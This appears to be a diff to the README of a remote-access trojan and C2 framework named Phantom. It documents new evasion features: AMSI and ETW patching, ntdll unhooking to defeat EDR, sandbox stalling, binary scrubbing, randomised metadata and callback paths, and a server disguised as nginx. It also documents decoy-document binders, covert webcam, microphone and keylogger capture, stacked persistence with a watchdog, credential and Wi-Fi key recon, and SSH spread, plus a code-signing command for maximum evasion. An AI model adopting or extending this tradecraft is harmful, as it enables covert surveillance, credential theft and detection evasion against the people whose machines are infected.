@@ -12,12 +12,64 @@ Runs as a single Docker container and deploys cleanly on Coolify.
 
 | Area | Feature |
 | --- | --- |
-| Transport | AES-256-GCM sealed beacons over HTTPS, sleep + jitter, fallback C2 URL |
-| Stealth | `-H windowsgui` (no console window), hidden child processes, `FreeConsole`, `-trimpath`, randomised user agent, start delay, optional `garble` / `upx` |
+| Transport | AES-256-GCM beacons under an X25519 + HKDF per-session key, sleep + jitter, fallback C2 URL, randomised `/v2/<token>/` paths, browser-shaped headers |
+| Stealth | `-H windowsgui` (no console window), AMSI + ETW patch, ntdll unhook, sandbox/debugger scoring with stall, watchdog re-spawn, cloaked self-copy, build-info scrub, randomised vendor metadata and artifact size, `-trimpath`, randomised user agent, start delay, optional `garble` / `upx` |
 | Binder | Wraps **any** file (PDF, DOCX, XLSX, ZIP, JPG, EXE …) into one executable that opens the decoy with the default handler and runs the implant behind it, with the matching document icon |
 | Surveillance | Live camera MJPEG stream, live microphone PCM stream to the browser, screenshots, one-shot webcam/mic capture, keylogger |
-| Control | Shell, file browser, upload/download, process list, persistence (systemd / Run key / cron), rootkit modules, network scan, SSH spread, SOCKS5 pivot |
-| Ops | Multi-target broadcast, per-target sleep/jitter, notes and tags, session export |
+| Control | Shell, file browser, upload/download, process list, stacked persistence (Run key + logon task + startup folder / systemd + cron + profile hook), rootkit modules, network scan, SSH spread, SOCKS5 pivot, host recon (AV/EDR, users, ARP, routes, Wi-Fi keys, credential stores) |
+| Ops | Parallel command execution, multi-target broadcast, per-target sleep/jitter, notes and tags, session export |
+
+---
+
+## Anti-trace & speed
+
+**Nothing on the wire is a signature.** Every build gets its own callback path
+(`/v2/<12 hex>/beacon` instead of `/beacon`), its own browser-shaped header set
+and its own vendor metadata, so two payloads from the same server share no
+stable string. `/beacon`, `/api/media/*` and the legacy PSK+AAD scheme stay
+mounted, so old builds keep working after an upgrade.
+
+**The PSK is an authenticator, not a traffic key.** At start-up the implant
+generates an ephemeral X25519 key, agrees a secret with the C2's X25519 key and
+derives the real key with HKDF over `PSK || shared` and a random salt. The
+public half plus salt ride in the `X-P` header and are bound in as AEAD
+additional data: a capture of one session opens nothing else, and the static
+key baked into a binary does not open live traffic. Beacons, camera frames,
+microphone PCM and uploads all use it.
+
+**Binary hygiene.** `-trimpath`, `-s -w`, an empty build ID, the `Go buildinf:`
+blob blanked and the module path replaced with random bytes, so `strings` and
+`go version -m` show no toolchain or project name. Metadata comes from a pool of
+real vendors, artifact size is padded at random (no stable hash), and an
+Authenticode certificate can be attached.
+
+**Host hygiene.** On Windows the implant patches `AmsiScanBuffer` (no
+PowerShell/.NET scanning), neuters `EtwEventWrite` (no ETW telemetry) and
+restores ntdll `.text` from a clean on-disk copy (removes userland EDR hooks)
+before the first packet. It also scores the host — debugger present, sleep
+skipping, CPU count, RAM, uptime, host/user names, hypervisor drivers — and
+stalls 20–40 s when it looks like a sandbox. `PHANTOM_STEALTH=off` disables all
+of it for troubleshooting.
+
+**Persistence is stacked, and it watches itself.** The implant drops a hidden
+copy, sets a Run key, a logon scheduled task and a startup-folder entry (systemd
+unit + cron + `~/.profile` hook on Unix), then schedules the original file for
+deletion at reboot. A detached shadow copy of the same binary polls the implant
+and restarts it when it dies, and the session id is on disk so the restarted
+process reuses the same dashboard entry instead of appearing twice.
+`persistence → remove` undoes all of it.
+
+**Speed.** Commands execute on a pool of workers (default 4, `PHANTOM_WORKERS`)
+and results flush on the next beacon instead of blocking the loop, so ten
+commands take one round trip instead of ten. Media and uploads are sealed and
+posted in parallel, connections are kept alive, the builder caches compilation
+per exact configuration plus a source fingerprint, and blocking filesystem work
+on the server runs off the event loop.
+
+**Server disguise.** The `Server` header reads `nginx` (not `uvicorn`),
+`x-process-time` is dropped, beacon responses carry `no-store` caching, and
+`PHANTOM_COVER` bounces unauthenticated browser visits to any URL you like — the
+dashboard stays reachable for a caller that already holds a session cookie.
 
 ---
 
@@ -71,9 +123,14 @@ template: [`.env.example`](.env.example).
 | `PHANTOM_TLS` | `false` | Keep off — the proxy terminates TLS |
 | `PHANTOM_LOG` | `info` | Uvicorn log level |
 | `PHANTOM_SEED` | `0` | `>0` seeds that many synthetic hosts for a first look |
-| `PHANTOM_DATA` / `PHANTOM_BUILDS` | `/data`, `/data/builds` | Keep on the volume (`PHANTOM_DATA` must stay `/data`, the compose volume target is static) |
-| `PHANTOM_VENDOR` | `Microsoft Corporation` | PE metadata company on artifacts |
+| `PHANTOM_DATA` / `PHANTOM_BUILDS` | `/data`, `/data/builds` | Keep on the volume (`PHANTOM_DATA` must stay `/data`, the compose volume target is static) — it holds the PSK, the X25519 C2 key, builds and blobs; losing it breaks every existing bot |
+| `PHANTOM_VENDOR` | `Microsoft Corporation` | PE metadata company on artifacts (`PHANTOM_RANDOMIZE` overrides it from a vendor pool) |
 | `PHANTOM_ENCRYPT` / `PHANTOM_METADATA` | `true` | Seal the embedded implant / apply metadata + icon |
+| `PHANTOM_RANDOMIZE` / `PHANTOM_PAD` | `true` | Random vendor metadata / random size filler, so artifacts never hash alike |
+| `PHANTOM_SCRUB` | `true` | Erase Go build-info and module path strings from artifacts |
+| `PHANTOM_STEALTH` | `auto` | `auto` = AMSI/ETW patch + ntdll unhook + sandbox stall, `off` = neither |
+| `PHANTOM_WORKERS` | `4` | Parallel command execution inside the implant (1–16) |
+| `PHANTOM_COVER` / `PHANTOM_SERVER` | *(empty)*, `nginx` | URL unauthenticated browser visits to `/` are bounced to / `Server` header value |
 | `PHANTOM_GARBLE` / `PHANTOM_UPX` | `false` | Obfuscation / compression, requires `INSTALL_GARBLE=1` / `INSTALL_UPX=1` build arg |
 | `PHANTOM_SIGN_PFX` / `PHANTOM_SIGN_PASS` | *(empty)* | Authenticode-sign every artifact |
 | `PHANTOM_SOCKS`, `PHANTOM_SOCKS_HOST`, `PHANTOM_SOCKS_PORT` | `true`, `127.0.0.1`, `1080` | SOCKS pivot listener |
@@ -349,29 +406,45 @@ for a bare binary, or **fileless .sh loader** for a memfd-only Linux payload.
 * **Rootkit** (Linux) needs `phantom_rootkit.ko` built with `make -C rootkit`
   and uploaded to the target.
 * Keylogging on Linux needs read access to `/dev/input/*` (root).
+* **Persistence** stacks every method it can: Run key + logon task + startup
+  folder on Windows, systemd unit + cron + `~/.profile` on Unix. `remove` takes
+  all of them plus the cloaked copies back out.
+* **Watchdog**: a detached shadow copy restarts the implant if it dies. Kill
+  both to stop a host for good (or use `persistence → remove` first).
+* **Recon** (`Host recon`) shells out for AV/EDR, users, ARP, routes, Wi-Fi keys,
+  credential-store paths and the software list — the output is raw, so a missing
+  tool shows the host's error instead of a silent gap.
 
 ## Detection notes
 
 No payload is invisible to every AV engine. What is done here:
 
 * GUI subsystem binary, no console flash, no visible window,
-* strings stripped (`-s -w`, `-trimpath`), optional `garble` identifier
-  obfuscation and `upx` packing,
-* realistic browser user agent, encrypted body, HTTPS with jittered timing,
+* strings stripped (`-s -w`, `-trimpath`), build-info and module path scrubbed,
+  optional `garble` identifier obfuscation and `upx` packing,
+* realistic vendor metadata, random artifact size, per-build callback path,
+* browser-shaped requests with a realistic user agent, per-session encryption,
+  HTTPS with jittered timing,
+* AMSI + ETW patched, ntdll unhooked, sandbox hosts stalled out,
 * decoy first: the user sees the document they expected.
 
-For maximum evasion add a code-signing certificate afterwards:
+Two artefacts on the test bench (Windows 11, Defender real-time on) after the
+full stealth path: `Trojan:Win32/Bearfoos.B!ml` and
+`Behavior:Win32/AMSI_Patch_T.B12` — ML heuristics plus the AMSI patch itself,
+both expected for a Go implant. For maximum evasion sign the artefact:
 
 ```sh
 osslsigncode sign -certs cert.pem -key key.pem -in in.exe -out out.exe
 ```
+
+and ship `PHANTOM_SIGN_PFX` so every build is signed automatically.
 
 ---
 
 ## Layout
 
 ```
-implant/            Go beacon (cross platform) + stealth + live media
+implant/            Go beacon (cross platform) + evasion + recon + live media
 server/             FastAPI C2, builder, binder stub, crypto, tool catalogue
 server/static/      dashboard SPA (login, views, palette) + styles
 fileless/           memfd loader template
@@ -406,6 +479,6 @@ cookie, HTTP basic auth or `?token=<password>`.
 | `POST` | `/api/build` | raw implant build |
 | `GET/DELETE` | `/api/builds…`, `/api/blobs…` | artifact and capture management |
 | `GET` | `/ws` | live operator socket |
-| `POST` | `/beacon` | encrypted beacon in/out |
-| `POST` | `/api/media/push`, `/api/media/upload` | camera/mic frames and captures |
+| `POST` | `/v2/{token}/beacon` | encrypted beacon in/out (legacy `/beacon` still served) |
+| `POST` | `/v2/{token}/push`, `/v2/{token}/upload` | sealed camera/mic frames and captures (legacy `/api/media/*` still served) |
 | `GET` | `/healthz` | container health probe |
